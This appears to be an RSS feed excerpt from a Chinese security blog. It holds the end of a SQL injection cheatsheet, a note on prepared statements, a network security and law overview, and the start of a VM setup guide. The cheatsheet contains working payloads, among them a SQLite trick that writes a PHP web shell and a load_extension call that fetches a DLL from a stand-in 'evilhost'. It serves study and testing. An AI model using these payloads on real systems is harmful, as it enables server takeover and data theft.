&lt;h4 id=&#34;基于log写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基于log写文件&#34;&gt;#&lt;/a&gt; 基于 log 写文件&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;show variables like &#39;%general%&#39;;
set global general_log = on;
set global general_log_file = &#39;/path/to/file&#39;;
select &#39;&amp;lt;?php var_dump(&amp;quot;test&amp;quot;);?&amp;gt;&#39;;
set global general_log_file = &#39;/original/path&#39;;
set global general_log = off;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;postgressql-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#postgressql-payload&#34;&gt;#&lt;/a&gt; PostgresSQL Payload&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Version
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT version()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Comment
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT 1 -- comment``SELECT /*comment*/1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Current User
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT user&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT current_user&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;``SELECT session_user`&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT getpgusername()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;List User
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT usename FROM pg_user&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Current Database
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT current_database()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;List Database
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT datname FROM pg_database&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ascii
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;SELECT char(0x41)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SELECT ascii(&#39;A&#39;)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Delay
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;pg_sleep(1)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;oracle-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#oracle-payload&#34;&gt;#&lt;/a&gt; Oracle Payload&lt;/h2&gt;
&lt;h3 id=&#34;常见payload-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload-3&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;dump&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from v$tablespace;``select * from user_tables;``select column_name from user_tab_columns where table_name = &#39;table_name&#39;;``select column_name, data_type from user_tab_columns where table_name = &#39;table_name&#39;;``SELECT * FROM ALL_TABLES&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Comment&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--``/**/&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Space&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0x00&lt;/code&gt;   &lt;code&gt;0x09&lt;/code&gt;   &lt;code&gt;0xa-0xd&lt;/code&gt;   &lt;code&gt;0x20&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;报错&lt;/p&gt;
&lt;p&gt;&lt;code&gt;utl_inaddr.get_host_name``ctxsys.drithsx.sn``ctxsys.CTX_REPORT.TOKEN_TYPE``XMLType``dbms_xdb_version.checkin``dbms_xdb_version.makeversioned``dbms_xdb_version.uncheckout``dbms_utility.sqlid_to_sqlhash``ordsys.ord_dicom.getmappingxpath``utl_inaddr.get_host_name``utl_inaddr.get_host_address&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;OOB&lt;/p&gt;
&lt;p&gt;&lt;code&gt;utl_http.request``utl_inaddr.get_host_address``SYS.DBMS_LDAP.INIT``HTTPURITYPE``HTTP_URITYPE.GETCLOB&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;绕过&lt;/p&gt;
&lt;p&gt;&lt;code&gt;rawtohex&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;写文件-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#写文件-2&#34;&gt;#&lt;/a&gt; 写文件&lt;/h3&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;replace&lt;/span&gt; directory TEST_DIR &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/path/to/dir&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;grant&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;write&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;on&lt;/span&gt; directory TEST_DIR &lt;span class=&#34;token keyword&#34;&gt;to&lt;/span&gt; system&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;declare&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   isto_file utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;file_type&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;begin&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   isto_file :&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fopen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;TEST_DIR&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test.jsp&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;W&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;put_line&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;isto_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;% out.println(&#34;test&#34;); %&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fflush&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;isto_file&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   utl_file&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fclose&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;isto_file&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;sqlite3-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sqlite3-payload&#34;&gt;#&lt;/a&gt; SQLite3 Payload&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Comment
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;--&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/**/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Version
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;select sqlite_version();&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Command Execution&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ATTACH &lt;span class=&#34;token keyword&#34;&gt;DATABASE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/var/www/lol.php&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; lol&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; lol&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pwn &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dataz &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; lol&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pwn &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dataz&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&amp;lt;?system($_GET[&#39;&lt;/span&gt;cmd&lt;span class=&#34;token string&#34;&gt;&#39;]); ?&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;Load_extension&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;load_extension&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;\\evilhost\evil.dll&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;E&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;nosql-payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nosql-payload&#34;&gt;#&lt;/a&gt; NoSQL Payload&lt;/h2&gt;
&lt;h3 id=&#34;常见payload-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见payload-4&#34;&gt;#&lt;/a&gt; 常见 Payload&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;绕过限制条件
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;username&amp;quot;: &amp;quot;user&amp;quot;&amp;#125;&lt;/code&gt;  =&amp;gt;  &lt;code&gt;&amp;#123;&amp;quot;username&amp;quot;: &amp;#123;&amp;quot;ne&amp;quot;: &amp;quot;fakeuser&amp;quot;&amp;#125;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$where&amp;quot;: &amp;quot;return true&amp;quot;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;测试用字符
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;&amp;quot;\/$[].&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;布尔测试常用
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$ne&amp;quot;: -1&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$in&amp;quot;: []&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$where&amp;quot;: &amp;quot;return true&amp;quot;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$or&amp;quot;: [&amp;#123;&amp;#125;,&amp;#123;&amp;quot;foo&amp;quot;:&amp;quot;1&amp;quot;&amp;#125;]&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;时间
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;quot;$where&amp;quot;: &amp;quot;sleep(100)&amp;quot;&amp;#125;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;预编译&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预编译&#34;&gt;#&lt;/a&gt; 预编译&lt;/h1&gt;
&lt;h2 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;SQL 注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的 SQL 引擎进行解析为 AST 或 Opcode，第二次交互发送数据，代入 AST 或 Opcode 中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。&lt;/p&gt;
&lt;h2 id=&#34;模拟预编译&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#模拟预编译&#34;&gt;#&lt;/a&gt; 模拟预编译&lt;/h2&gt;
&lt;p&gt;为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。&lt;/p&gt;
&lt;h2 id=&#34;绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#绕过&#34;&gt;#&lt;/a&gt; 绕过&lt;/h2&gt;
&lt;h3 id=&#34;预编译使用错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预编译使用错误&#34;&gt;#&lt;/a&gt; 预编译使用错误&lt;/h3&gt;
&lt;p&gt;预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。&lt;/p&gt;
&lt;h3 id=&#34;部分参数不可预编译&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#部分参数不可预编译&#34;&gt;#&lt;/a&gt; 部分参数不可预编译&lt;/h3&gt;
&lt;p&gt;在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。&lt;/p&gt;
&lt;h3 id=&#34;预编译实现错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预编译实现错误&#34;&gt;#&lt;/a&gt; 预编译实现错误&lt;/h3&gt;
&lt;p&gt;部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。&lt;/p&gt;
&lt;h1 id=&#34;参考文章&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考文章&#34;&gt;#&lt;/a&gt; 参考文章&lt;/h1&gt;
&lt;h2 id=&#34;tricks&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tricks&#34;&gt;#&lt;/a&gt; Tricks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cud2lsczBuLmNuL2FyY2hpdmVzLzE3OC8=&#34;&gt;sqlmap time based inject 分析&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL05ldFNQSS9TUUxJbmplY3Rpb25XaWtp&#34;&gt;SQLInjectionWiki&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvQnVjQ055Q215QVRkUkVOWnAwQUYyQQ==&#34;&gt;常见数据库写入 Webshell 汇总&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdUVOdnBQYW43YVZkN01iU29BVDlEZw==&#34;&gt;MSSQL 数据库攻击实战指北&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass&#34;&gt;#&lt;/a&gt; Bypass&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZlNCWlBrTzAtSE5ZZkxnbVlXSktDZw==&#34;&gt;SQL 注入 ByPass 的一些小技巧&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzY4&#34;&gt;Waf Bypass 之道&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FsZWVuenovTVlTUUxfU1FMX0JZUEFTU19XSUtJ&#34;&gt;MySQL Bypass Wiki&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nosql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nosql&#34;&gt;#&lt;/a&gt; NoSQL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy55dW53ZWlwYWkuY29tL2FyY2hpdmVzLzE0MDg0Lmh0bWw=&#34;&gt;NoSQL 注入的分析和缓解&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvdEc4NzRMTlRJZGlON01QdE8taG92QQ==&#34;&gt;NoSQL 注入&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;cheatsheet-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cheatsheet-2&#34;&gt;#&lt;/a&gt; Cheatsheet&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0lnbml0ZXRlY2hub2xvZ2llcy9NU1NRTC1QZW50ZXN0LUNoZWF0c2hlZXQ=&#34;&gt;MSSQL Pentest Cheatsheet&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/netwsecu/</guid>
            <title>网络安全观</title>
            <link>https://mobius-0.github.io/security/WebNote/netwsecu/</link>
            <category>网络安全</category>
            <category>法律法规</category>
            <pubDate>Thu, 24 Nov 2022 10:25:18 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;网络安全定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络安全定义&#34;&gt;#&lt;/a&gt; 网络安全定义&lt;/h1&gt;
&lt;p&gt;网络安全的一个通用定义指网络信息系统的硬件、软件及其系统中的数据受到保护，不因偶然的或者恶意的破坏、更改、泄露，系统能连续、可靠、正常地运行，服务不中断。网络安全简单的说是在网络环境下能够识别和消除不安全因素的能力。&lt;/p&gt;
&lt;p&gt;网络安全在不同环境和应用中有不同的解释，例如系统运行的安全、系统信息内容的安全、信息通信与传播的安全等。&lt;/p&gt;
&lt;p&gt;网络安全的基本需求包括可靠性、可用性、保密性、完整性、不可抵赖性、可控性、可审查性、真实性等。其中三个最基本的要素是机密性 (Confidentiality)、完整性 (Integrity)、可用性 (Availability)。&lt;/p&gt;
&lt;p&gt;机密性是不将有用信息泄漏给非授权用户的特性。可以通过信息加密、身份认证、访问控制、安全通信协议等技术实现，信息加密是防止信息非法泄露的最基本手段，主要强调有用信息只被授权对象使用的特征。&lt;/p&gt;
&lt;p&gt;完整性是指信息在传输、交换、存储和处理过程中，保持信息不被破坏或修改、不丢失和信息未经授权不能改变的特性，也是最基本的安全特征。&lt;/p&gt;
&lt;p&gt;可用性指信息资源可被授权实体按要求访问、正常使用或在非正常情况下能恢复使用的特性。在系统运行时正确存取所需信息，当系统遭受意外攻击或破坏时，可以迅速恢复并能投入使用。是衡量网络信息系统面向用户的一种安全性能，以保障为用户提供服务。&lt;/p&gt;
&lt;p&gt;网络安全的主体是保护网络上的数据和通信的安全，数据安全性是指软硬件保护措施，用来阻止对数据进行非授权的泄漏、转移、修改和破坏等，通信安全性是通信保护措施，要求在通信中采用保密安全性、传输安全性、辐射安全性等措施。&lt;/p&gt;
&lt;h1 id=&#34;相关法律法规&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关法律法规&#34;&gt;#&lt;/a&gt; 相关法律法规&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ucGMuZ292LmNuL25wYy9jMzA4MzQvMjAxNjExLzI3MGI0M2U4YjM1ZTRmN2VhOTg1MDJiNmYwZTI2ZjhhLnNodG1s&#34;&gt;中华人民共和国网络安全法&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5nb3YuY24vemhlbmdjZS96aGVuZ2Nla3UvMjAyMS0wNy8xNC9jb250ZW50XzU2MjQ5NjUuaHRt&#34;&gt;网络产品安全漏洞管理规定&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5nb3YuY24vemhlbmdjZS9jb250ZW50LzIwMjEtMDgvMTcvY29udGVudF81NjMxNjcxLmh0bQ==&#34;&gt;关键信息基础设施安全保护条例&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ucGMuZ292LmNuL25wYy9jMzA4MzQvMjAyMTA4L2E4YzRlMzY3MmM3NDQ5MWE4MGI1M2ExNzJiYjc1M2ZlLnNodG1s&#34;&gt;中华人民共和国个人信息保护法&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ucGMuZ292LmNuL25wYy9jMzA4MzQvMjAyMTA2LzdjOWFmMTJmNTEzMzRhNzNiNTZkNzkzOGY5OWE3ODhhLnNodG1s&#34;&gt;中华人民共和国数据安全法&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/VMware/</guid>
            <title>虚拟机安装</title>
            <link>https://mobius-0.github.io/security/VMware/</link>
            <category>网络安全</category>
            <category>工具</category>
            <category>虚拟机</category>
            <pubDate>Wed, 23 Nov 2022 10:52:33 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;关于虚拟化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关于虚拟化&#34;&gt;#&lt;/a&gt; 关于虚拟化&lt;/h1&gt;
&lt;p&gt;虚拟化技术在目前的互联网中算是非常关键的基础技术之一，细分下去可以有服务器虚拟化、网络虚拟化、应用虚拟化等等，这里我们要做的主要是物理机的虚拟化，也可以说是服务器的虚拟化。&lt;/p&gt;
&lt;p&gt;服务器的虚拟化又可以分为两种实现方式：寄居虚拟化和裸机虚拟化&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;寄居虚拟化即将虚拟化服务部署在物理机已经安装好的操作系统上，这样效率和稳定性较低，但模式简单；而裸机虚拟化则将虚拟化读物直接部署在物理机上，效率较高，且在合理的逻辑划分下安全性和稳定性都有了较大的提高&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里我们会用到的是寄居虚拟化，也就是在现有操作系统上安装虚拟化服务软件如 VMware Workstation、Virtual Box 等。&lt;/p&gt;
&lt;h1 id=&#34;虚拟化服务软件的安装&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#虚拟化服务软件的安装&#34;&gt;#&lt;/a&gt; 虚拟化服务软件的安装&lt;/h1&gt;
